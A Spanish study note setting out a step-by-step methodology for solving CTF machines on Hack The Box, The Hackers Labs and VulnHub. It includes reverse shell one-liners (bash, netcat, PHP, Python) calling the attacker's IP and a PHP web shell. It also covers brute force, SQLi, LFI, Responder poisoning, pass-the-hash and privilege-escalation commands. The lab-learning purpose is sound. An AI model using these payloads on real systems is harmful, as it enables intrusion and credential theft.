# Metodología General — Máquinas CTF (HTB, THL, VulnHub)

> [!info] Objetivo
> Guía unificada y completa para resolver CUALQUIER máquina en plataformas como Hack The Box, The Hackers Labs o VulnHub. Basada en apuntes reales y write-ups resueltos.

---

## Flujo Completo (Resumen Visual)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  0. PREPARACIÓN                                                             │
│     ↓                                                                       │
│  1. RECONOCIMIENTO (¿Qué hay?)                                              │
│     ↓                                                                       │
│  2. ENUMERACIÓN (¿Qué hace y cómo?)                                         │
│     ↓                                                                       │
│  3. EXPOLOTACIÓN (¿Cómo entro?)                                             │
│     ↓                                                                       │
│  4. POST-EXPOLOTACIÓN (¿Qué tengo dentro?)                                  │
│     ↓                                                                       │
│  5. ESCALADA DE PRIVILEGIOS (¿Cómo llego a root?)                           │
│     ↓                                                                       │
│  6. FLAGS y DOCUMENTACIÓN                                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## FASE 0: PREPARACIÓN

### Estructura de carpetas (siempre lo mismo)

```bash
mkdir -p <nombre_maquina>/{recon,exploits,loot,scripts}
cd <nombre_maquina>
```

### Checklist previo

- [ ] VPN conectada (HTB: `sudo openvpn <file>.ovpn`)
- [ ] IP de la máquina objetivo identificada
- [ ] Herramientas instaladas: nmap, feroxbuster, ffuf, hydra, impacket, linpeas/winpeas
- [ ] Listener listo (si vas a recibir reverse shell)

---

## FASE 1: RECONOCIMIENTO

> [!tip] Objetivo: Descubrir hosts, puertos y servicios expuestos

### 1.1 Descubrir hosts (si hay varios en la red)

```bash
# ARP scan (funciona en redes locales, NO en cloud)
sudo netdiscover -r <target>/24

# O con nmap
nmap -sn <target>/24
```

### 1.2 Escaneo de puertos y servicios

```bash
# PASO 1: Escaneo rápido inicial
nmap -sC -sV -oN recon/initial.txt <target>

# PASO 2: Todos los puertos (el -sC no va con -p-)
nmap -p- -oN recon/allports.txt <target>

# PASO 3: Scripts sobre puertos encontrados
nmap -sC --script default,vuln -sV -Pn -p <PUERTOS> -oA recon/full <target>

# Para UDP (si hay servicios como SNMP, TFTP, DNS)
nmap -sU -sV -p- <target>
```

#### Nmap avanzado (repaso 02.09)

```bash
# Scripts por categoría
nmap --script discovery <target>     # enumeración de servicios
nmap --script auth <target>          # autenticaciones débiles
nmap --script brute <target>         # fuerza bruta por scripts (ruidoso)

# Configuración avanzada
nmap -T4 -sC -sV <target>            # T4 = el más rápido (T0-T5; subir con cuidado)
nmap -sS -T2 <target>                # sigiloso (stealth)
nmap -O <target>                     # detección de SO
```

> [!warning] `-sS` no va con ProxyChains
> A través de proxy solo funciona `-sT` (connect scan). Ver tabla de errores comunes.

### 1.3 Determinar el tipo de máquina

```
¿Es Windows o Linux?
├── Linux → Metodología Linux (Fase 2a)
└── Windows
     ├── ¿Tiene Active Directory? → Metodología AD (Fase 2c)
     └── Solo máquina local → Metodología Windows (Fase 2b)

¿Es una aplicación web?
└── Sí → Metodología Web (Fase 2a)
```

**Cómo distinguir:**
- Linux: SSH (22), Apache/Nginx (80), versiones con "Debian/Ubuntu/CentOS"
- Windows: SMB (445), RDP (3389), IIS (80), WinRM (5985)
- AD: LDAP (389), Kerberos (88), DNS (53)

### 1.4 OSINT técnico: Shodan (repaso 02.09)

```bash
# Búsquedas útiles cuando hay IPs públicas
# Filtros: port:80, product:"Apache", country:"ES", vuln:CVE-XXXX
# Por IP, por servicio, por país
```

Shodan complementa el reconocimiento: versiones expuestas, servicios fuera de estándar y CVEs asociados antes de tocar la máquina.

---

## FASE 2: ENUMERACIÓN

> [!important] El 80% del hacking es ENUMERAR. No te apures a explotar.

### 2a. Servicios Web (el más habitual)

#### Fuzzing de directorios

```bash
# Feroxbuster (recomendado — recursivo por defecto)
feroxbuster -u http://<target> -o recon/directories.txt

# Con wordlist específico
feroxbuster -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# FFUF
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Dirsearch (con recursividad)
dirsearch -u http://<target>/ -r
```

#### Análisis de la web

```bash
# Ver código fuente (SIEMPRE, hay credenciales hardcodeadas)
# En navegador: Ctrl+U
# En terminal:
curl -s http://<target> | grep -i "password\|pass\|pwd\|secret\|key"

# robots.txt (SIEMPRE revisar)
curl http://<target>/robots.txt

# technology detection
whatweb http://<target>
```

#### Si es WordPress

```bash
# Enumerar todo
wpscan --url http://<target>/wordpress

# Enumerar usuarios
wpscan --url http://<target>/wordpress -e u

# Enumerar plugins
wpscan --url http://<target>/wordpress --enumerate ap

# Plugins con CVEs (necesita API token gratis)
wpscan --url http://<target>/wordpress --enumerate vp --api-token <TOKEN>

# Fuerza bruta (ÚLTIMO RECURSO)
wpscan --url http://<target>/wordpress -U <usuario> -P /usr/share/wordlists/rockyou.txt
```

#### Si el sitio usa dominios

```bash
# Si redirige a un dominio, añadir a /etc/hosts
sudo nano /etc/hosts
# Añadir: <IP> <dominio>
```

### 2b. Servicios con login

#### SSH (Puerto 22)

```bash
# Fuerza bruta
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://<target>

# Si tienes credenciales
ssh <usuario>@<target>
```

#### FTP (Puerto 21)

```bash
# ¿Permite acceso anónimo?
ftp anonymous@<target>

# Fuerza bruta
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://<target>

# Si encuentras archivos, descargarlos
get <archivo>
```

#### SMB (Puerto 445)

```bash
# Enumeración
smbclient -L //<target> -N
enum4linux -a //<target>
nmap -p 445 --script smb-enum-shares,smb-enum-users <target>

# Si encuentras shares
smbclient //<target>/<share> -N

# Con credenciales
crackmapexec smb <target> -u <user> -p <pass> --shares
```

#### MySQL/PostgreSQL

```bash
# Conexión
mysql -h <target> -u root -p
psql -h <target> -U postgres

# Fuerza bruta
hydra -l root -P passwords.txt mysql://<target>
```

#### RDP (Puerto 3389)

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target>
```

#### WinRM (Puertos 5985/5986)

```bash
evil-winrm -i <target> -u <user> -p <pass>
```

### 2c. Active Directory

```bash
# DNS
nslookup <target>
nslookup -type=SRV _ldap._tcp.<domain>

# LDAP
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>"

# BloodHound
bloodhound-python -u <user> -p <pass> -d <domain> -c All -ns <target>

# Kerberoasting
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <target> -request

# AS-REP Roasting
impacket-GetNPUsers <domain>/ -dc-ip <target> -usersfile users.txt -format hashcat
```

#### Captura de credenciales: Responder (LLMNR/NBT-NS poisoning)

En redes Windows, cuando un host busca un recurso que **no existe**, broadcastea por LLMNR/NBT-NS. Responder se pone en medio con servidores falsos (HTTP, HTTPS, SMB) y envenena esa respuesta para capturar la autenticación NTLM del víctima:

```bash
# Escuchar en la interfaz de la VPN/HTB
sudo responder -I tun0

# Dejarlo corriendo en segundo plano mientras enumeras
# Cuando un Windows acceda a un recurso inexistente → captura el hash NTLMv2
```

> [!important] Combinación clásica (clase 04.06)
> Responder solo captura hashes. El siguiente paso habitual es **ntlmrelayx** para relay de NTLM hacia otros hosts — se verá en profundidad en el módulo de Active Directory.

### 2d. Cloud: buckets (S3, Azure Blob, GCP) — repaso 02.09

```bash
# Buscar buckets expuestos
nmap --script s3-bucket,http-enum <target>
# O con Shodan (filtros de almacenamiento)

# Listar contenido
aws s3 ls s3://<bucket> --endpoint-url <url>
# Descargar
aws s3 cp s3://<bucket>/<fichero> . --endpoint-url <url>
# Subir (si hay permisos write)
aws s3 cp archivo s3://<bucket>/ --endpoint-url <url>
```

---

## FASE 3: EXPOLOTACIÓN

> [!danger] Obtener acceso (shell o credenciales)

### 3.1 Antes de explotar — ¿Qué tengo?

```
Servicios encontrados → Buscar CVEs → Configuraciones débiles → Credenciales
```

**3 vectores de ataque (en orden):**

1. **Fuerza bruta** → hydra, wpscan, medusa
2. **Versión con CVE explotable** → searchsploit, metasploit
3. **Mala configuración** → el más habitual (FTP anónimo, SMB sin auth, etc.)

### 3.2 Vector: Web (el más común)

#### SQL Injection

```bash
# Automático con sqlmap
sqlmap -u "http://<target>/page?id=1" --dbs --batch

# Con autenticación (cookie)
sqlmap -u "http://<target>/page?id=1" --cookie="session=xxx" --dbs --batch

# Para obtener shell
sqlmap -u "http://<target>/page?id=1" --os-shell
```

#### Command Injection

```bash
# Probar en parámetros
; id
| id
`id`
$(id)
```

#### File Upload (Webshell)

```bash
# Subir reverse shell PHP
# En WordPress: Apariencia → Editor de temas → 404.php
# Pegar reverse shell PHP:
<?php
$sock = fsockopen("<tu_ip>", 4444);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

# Listener en tu máquina
nc -lvnp 4444

# Visitar http://<target>/404.php para disparar
```

#### LFI / Path Traversal

```bash
# Probar
../../../../etc/passwd
php://filter/convert.base64-encode/resource=config.php

# En parámetros POST
curl -X POST http://<target>/descargar.php -d "archivo=../../../../etc/passwd"
```

#### IDOR

```bash
# Iterar parámetros numéricos
?id=1 → ?id=2 → ?id=3...
# Si cambia el contenido → IDOR
```

### 3.2 Vector: Reverse Shells

> [!important] SIEMPRE primero el listener

```bash
# En tu máquina
nc -lvnp 4444
```

#### Payloads comunes (usa revshells.com)

```bash
# Bash
bash -i >& /dev/tcp/<tu_ip>/4444 0>&1

# Netcat (la que casi siempre funciona)
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tu_ip> 4444 >/tmp/f

# PHP
php -r '$sock=fsockopen("<tu_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<tu_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### 3.3 Vector: Metasploit

```bash
# Buscar exploit
search <servicio>

# Usar
use exploit/<ruta>
set RHOSTS <target>
set LHOST <tu_ip>
set PAYLOAD <payload>
run
```

### 3.4 Vector: Windows (Impacket)

```bash
# PSExec
impacket-psexec <user>:<pass>@<target>

# Pass-the-Hash
impacket-psexec -hashes :<NTLM_HASH> <user>@<target>

# WMIExec (shell semi-interactiva)
impacket-wmiexec <user>:<pass>@<target>

# SMBExec
impacket-smbexec <user>:<pass>@<target>
```

### 3.5 Vector: Credenciales reutilizadas

```bash
# Si encontraste credenciales en un servicio, probar en otros
# Ejemplo: credenciales de FTP → probar en SSH
ssh <user>@<target>  # con la contraseña encontrada
```

---

## FASE 4: POST-EXPOLOTACIÓN

> [!note] Consolidar acceso y obtener más información

### 4.1 Estabilizar la shell (SIEMPRE)

```bash
# 1) Spawnear PTY con Python
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2) Suspender la shell (Ctrl+Z)

# 3) En tu Kali: terminal en crudo + traer la shell
stty raw -echo; fg

# 4) Reparar pantalla
reset
export TERM=xterm
```

### 4.2 Obtener la User Flag

```bash
cat /home/<usuario>/user.txt
find / -name user.txt 2>/dev/null
```

### 4.3 Recopilar información del sistema

```bash
# Linux
whoami
id
uname -a
cat /etc/os-release
ifconfig  # o ip a

# Windows
whoami /all
systeminfo
hostname
```

### 4.4 Transferir herramientas

```bash
# En tu máquina: servidor HTTP
python3 -m http.server 8000

# En la víctima
curl http://<tu_ip>:8000/linpeas.sh -o linpeas.sh
wget http://<tu_ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 4.5 Extraer hashes (Windows)

```bash
# Meterpreter
hashdump
load kiwi
creds_all

# Impacket
impacket-secretsdump <user>:<pass>@<target>
```

---

## FASE 5: ESCALADA DE PRIVILEGIOS

> [!warning] Conseguir root / Administrator

### 5.1 Diagnóstico rápido (SIEMPRE en este orden)

```bash
# Linux
sudo -l                    # ¿Qué puedo ejecutar como root?
id                         # ¿Qué grupos tengo?
find / -perm -4000 2>/dev/null  # ¿Qué binarios tienen SUID?
cat /etc/crontab           # ¿Qué cronjobs hay?
find / -writable -type f 2>/dev/null  # ¿Qué ficheros puedo escribir?
uname -a                   # Versión del kernel
cat /etc/os-release

# Windows
systeminfo                 # Versión, patches
whoami /all                # Privilegios
sc query                   # Servicios
wmic product get name,version  # Programas instalados
netstat -ano               # Puertos abiertos
```

### 5.2 Herramientas de escalada

```bash
# Linux
chmod +x linpeas.sh && ./linpeas.sh
./LinEnum.sh -t
./linux-exploit-suggester.sh

# Windows
winpeas.exe
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
SharpUp.exe audit
run post/multi/recon/local_exploit_suggester  # en Metasploit
```

### 5.3 Vectores comunes de escalada

#### SUID binaries

```bash
# Buscar
find / -perm -u=s -type f 2>/dev/null

# Si find tiene SUID
find / -exec /bin/sh -p \;

# Si python tiene SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# GTFOBins: https://gtfobins.github.io/ (SIEMPRE consultar)
```

#### Secuestro de PATH

```bash
# Cuando un binario ejecuta un comando sin ruta absoluta
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/<binario>  # ejecuta nuestro "cat" malicioso como root
```

#### sudo + GTFOBins

```bash
# Si sudo -l dice que puedes ejecutar vi como root
sudo /bin/vi /ruta/permitida
# Dentro de vi:
:!/bin/bash  # → shell como root
```

#### Grupos peligrosos

| Grupo | Explotación |
|-------|-----------|
| **docker** | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| **lxd** | Crear contenedor con acceso al host |
| **disk** | Leer /etc/shadow directamente |

#### Cronjobs

```bash
# Buscar cronjobs que ejecuten scripts como root
cat /etc/crontab
ls -la /etc/cron*
# Si encuentras un script world-writable → sobrescribir con reverse shell
```

#### Kernel exploits

```bash
# Buscar con SearchSploit
searchsploit linux kernel <version>
# O con linux-exploit-suggester.sh
```

#### Patrones avanzados de escalada (máquinas THL resueltas)

| Patrón | Máquina | Cómo funciona |
|--------|---------|---------------|
| **SUID + GTFOBins** | Mr. Robot, Inj3ctCrew | `nmap --interactive` → `!sh` / SUID bash → `bash -p` |
| **NOPASSWD + script 777** | Nibbles, Banco | `echo 'chmod +s /bin/bash' >> script.sh` → `sudo ./script.sh` |
| **chattr (inmutabilidad)** | Banco | `backup.sh` tiene flag `i` (inmutable): quitarla con otro SUID (`chattr -i`) antes de editar |
| **sed para escribir como root** | Castor | Abusar de un binario con sudo que permite escritura con `sed` → tocar `/etc/crontab` → SUID bash |
| **Sobrescritura de script en /opt** | Nike, Academy | Script que corre como otro usuario vía sudo → sustituir por reverse shell |
| **logrotate / cron** | Nike | Rotación de logs ejecutando código → reverse shell en el ciclo siguiente |
| **Java con sudo** | Nike | `sudo java` → subir `.class`/`.jar` propio que ejecuta comandos |
| **Binario escribible (buffer overflow)** | Rockstars | Editar binario de otro usuario → payload directo |
| **Library hijacking** | Rockstars | Script que importa librería por nombre relativo → plantearla en PATH |

> [!important] Hilo conductor
> Casi todas las escalationes THL siguen el mismo esquema: **`sudo -l` / `find -perm -4000` → encontrar una ejecución permitida → abusar de ella para dejar SUID en bash o spawnear shell root**. El detalle cambia, el patrón no.

#### Windows específicos

| Vector | Herramienta |
|--------|-------------|
| Token impersonation | `getsystem` en Meterpreter |
| Service abuse | `sc config`, `sc start` |
| AlwaysInstallElevated | MSI installer |
| Unquoted service path | Buscar rutas sin comillas |
| DLL hijacking | Reemplazar DLL |

### 5.4 Obtener la Root Flag

```bash
# Linux
/bin/bash -p
cat /root/root.txt

# Windows
# En Meterpreter
cat C:\Users\Administrator\Desktop\root.txt
```

---

## FASE 6: FLAGS y DOCUMENTACIÓN

### Flags

```bash
# User flag
cat /home/<usuario>/user.txt

# Root flag
cat /root/root.txt
```

### Documentar la cadena de explotación

Siempre apuntar la cadena completa:

```
┌─────────────────────────────────────────────────────────┐
│ 1. [Herramienta] → [Qué encontraste]                   │
│ 2. [Herramienta] → [Qué encontraste]                   │
│ ...                                                     │
│ N. [Herramienta] → [Root flag]                         │
└─────────────────────────────────────────────────────────┘
```

### Cadenas de referencia (máquinas resueltas)

Cadenas reales de informes y write-ups del vault — patrones a reconocer antes de encarar una máquina nueva:

| Máquina | Plataforma | Cadena completa |
|---------|-----------|-----------------|
| **Meow / Fawn / Dancing / Redeemer** | HTB Tier 0 | Telnet/FTP/SMB/Redis con acceso por defecto o anónimo → flag directa (enum primero) |
| **Vaccine** | HTB SP | FTP anónimo → ZIP protegido (zip2john) → hash MD5 admin (rockyou) → SQLi con sqlmap `--os-shell` → reverse shell → `sudo vi` → root |
| **Nibbles** | HTB | Comentario HTML → Nibbleblog login por defecto → file upload (plugin My Image) → RCE → `sudo -l` NOPASSWD en `monitor.sh` 777 → `echo 'chmod +s /bin/bash' >>` → `bash -p` |
| **Reactor** | HTB | CVE-2025-29927 (Next.js middleware bypass) → Node Inspector (9229) → hashes SQLite → Crackeo → SSH → SUID `/bin/bash` → root |
| **Oopsie** | HTB SP | Enum web → IDOR → robo de cookie → webshell → www-data → `sudo -u robert` → PATH hijacking (`bugtracker`) → root |
| **Archetype** | HTB SP | SMB sesión nula → MSSQL con Impacket → `xp_cmdshell` → Netcat → reverse shell → WinPEAS → Administrator |
| **RickdiculouslyEasy** | VulnHub | RCE en cgi-bin → SSH:22222 (`summer:winter`) → ficheros robados → diccionario contextual + Hydra → `sudo su` → root |
| **Mr. Robot** | VulnHub | robots.txt (flag 1 + diccionario) → sanitizar diccionario → user `elliot` (Intruder) → editor 404.php → daemon → MD5 CrackStation → robot (flag 2) → SUID nmap `!sh` → root (flag 3) |
| **Rockstars** | THL | Fuzzing de parámetros → LFI POST → `db.php` → SSH `shark` → binario escribible → `wvverez` → ZIP+John → Hydra → `username3` → library hijacking → root |
| **Banco** | THL | Código fuente → panel admin → Path Traversal (`descargar.php`) → config → SSH reutilizando credenciales → `backup.sh` (SUID + inmutable) → `chattr -i` → cron → root |
| **Nike** | THL | XXE en `upload.php` → ficheros → SSH `mike` (bypass rbash) → sudo Java → `n` → script `/opt/suma.py` → `pylon` → logrotate → `macci` → root |
| **Castor** | THL | XXE upload.php → php://filter → Hydra SSH `castorcin` → sudo `sed` → escribe `/etc/crontab` → SUID bash → root |
| **Inj3ctCrew** | THL | Gobuster → `backup.php` + hash (John) → panel `P4n3l.php` → SUID bash personalizado → `nolen11` → persistencia SSH → root |
| **Academy** | THL | dirsearch recursivo → `/etc/hosts` → WPScan (usuarios+plugins+CVE) → fuerza bruta WP → editor de temas → reverse shell → estabilizar → escalada |

> [!tip] Patrón transversal
> Casi todas encadenan: **enum web a fondo (directorios, código fuente, robots.txt) → credenciales (default/dump/fuerza bruta dirigida) → ejecución de código → reverse shell → `sudo -l`/SUID → root**. Cuando una máquina "no avanza", es porque falta un eslabón de ENUMERACIÓN, no de explotación.

---

## FLUJO DE DECISIÓN RÁPIDO

```
¿Qué servicios hay?
├── Web (80/443)
│   ├── WordPress → WPScan
│   ├── PHP/ASP → ffuf + feroxbuster → buscar LFI/RCE/SQLi
│   └── Login → hydra (brute force como último recurso)
├── SSH (22)
│   └── hydra → si hay credenciales en otro servicio → probar
├── FTP (21)
│   ├── Anónimo → descargar archivos → buscar credenciales
│   └── Brute force → hydra
├── SMB (445)
│   ├── Enumeración → shares → buscar credenciales
│   └── Nmap scripts → vulnerabilidades
├── MySQL/DB (3306/5432)
│   └── Conexión → buscar credenciales en la DB
├── RDP (3389)
│   └── hydra → si hay credenciales → evil-winrm
└── AD (389/88)
    ├── BloodHound → rutas de ataque
    ├── Kerberoasting → crackear tickets
    └── DCSync → hashes del dominio
```

---

## ERRORES COMUNES (y cómo evitarlos)

| Error | Consecuencia | Solución |
|-------|-------------|----------|
| No estabilizar la shell | No funciona `clear`, `vim`, etc. | Siempre hacer la secuencia TTY |
| Olvidar el listener antes de la reverse shell | La conexión falla | SIEMPRE primero `nc -lvnp 4444` |
| No revisar código fuente | Credenciales hardcodeadas perdidas | SIEMPRE `Ctrl+U` o `curl` |
| Brute force sinEnumerar primero | Ruidoso e ineficiente | PrimeraEnumerar, luego brute force |
| No probar credenciales en otros servicios | Oportunidades perdidas | Si encuentras user:pass → probar en SSH, FTP, etc. |
| No usar `-p-` en nmap | Puertos altos perdidos | SIEMPRE nmap `-p-` después del escaneo inicial |
| No verificar `/etc/hosts` | Herramientas fallan con dominios | Si redirige → añadir IP + dominio |
| Usar `-sS` con ProxyChains | No funciona | Solo `-sT` con ProxyChains |

---

## HERRAMIENTAS DE REFERENCIA

| Categoría | Herramientas |
|-----------|--------------|
| **Escaneo** | nmap, netdiscover |
| **Fuzzing web** | feroxbuster, ffuf, dirsearch, gobuster |
| **CMS** | wpscan (WordPress) |
| **Fuerza bruta** | hydra, wpscan |
| **Explotación** | metasploit, impacket, searchsploit |
| **Escalada Linux** | linpeas, LinEnum, linux-exploit-suggester |
| **Escalada Windows** | winpeas, PowerUp, SharpUp |
| **Reverse shells** | revshells.com, netcat, socat |
| **Proxies** | proxychains, sshuttle |
| **Passwords** | john, hashcat |

---

## Referencia

Basado en:
- Metodología de Explotación Linux/Windows/AD
- Write-ups: Academy, Banco, Archetype, Oopsie, Vaccine
- GTFOBins, HackTricks, PayloadsAllTheThings
- Prácticas reales en HTB Starting Point y The Hackers Labs

> [!tip] REGLA DE ORO
> **El 80% del hacking es enumerar.** No te apures a explotar. Primero entiende qué hay, cómo funciona, y dónde están las debilidades. La explotación es solo el paso final de un proceso de reconocimiento minucioso.

---

> #checklist
- [ ] Metodología memorizada
- [ ] Herramientas instaladas
- [ ] Wordlists preparadas
- [ ] GTFOBins en bookmarks
- [ ] revshells.com en bookmarks
- [ ] Responder configurado en la interfaz de VPN
- [ ] Shodan y búsqueda de buckets en el checklist de recon
- [ ] Patrones avanzados de escalada (chattr, sed, logrotate, Java sudo) reconocidos

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[00 - Metodologías de Explotación.md|00 - Metodologías de Explotación]] — Mapa de todas las metodologías
- [[Metodología - Explotación Linux.md|Metodología - Explotación Linux]] — Detalle Linux
- [[Metodología - Explotación Windows.md|Metodología - Explotación Windows]] — Detalle Windows
- [[Metodología - Active Directory.md|Metodología - Active Directory]] — Detalle AD
- [[Metodologia - Aplicaciones Web.md|Metodologia - Aplicaciones Web]] — Detalle Web
- [[Reverse Shells y Post-Explotación.md|Reverse Shells y Post-Explotación]] — Shells
- [[Escalada de Privilegios.md|Escalada de Privilegios]] — Escalada
- [[Pivoting y Movilidad Lateral.md|Pivoting y Movilidad Lateral]] — Pivoting

### Write-ups de referencia

- [[../../write-ups/Academy-THL.md|Academy-THL]] — WordPress + RCE
- [[../../write-ups/Banco-THL.md|Banco-THL]] — Path Traversal + SUID + cronjob
- [[Prácticas CTF - HTB y VulnHub.md|Prácticas CTF - HTB y VulnHub]] — Oopsie, Archetype, Vaccine

> #checklist #hack_the_box #metodologia_pentest #linux #windows #web #active_directory #escalada_privilegios #post_explotacion
